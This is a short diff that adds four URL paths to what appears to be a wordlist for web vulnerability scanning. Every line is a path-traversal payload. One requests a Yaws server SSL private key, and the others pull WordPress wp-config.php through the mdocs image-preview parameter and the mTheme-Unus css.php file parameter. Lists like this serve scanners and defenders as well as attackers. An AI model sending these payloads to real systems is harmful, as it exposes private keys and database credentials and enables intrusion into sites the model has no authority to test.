@@ -1,0 +1,4 @@
+/%5C../ssl/yaws-key.pem
+/mdocs-posts/?mdocs-img-preview=../../../wp-config.php
+/?mdocs-img-preview=../../../wp-config.php
+/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php
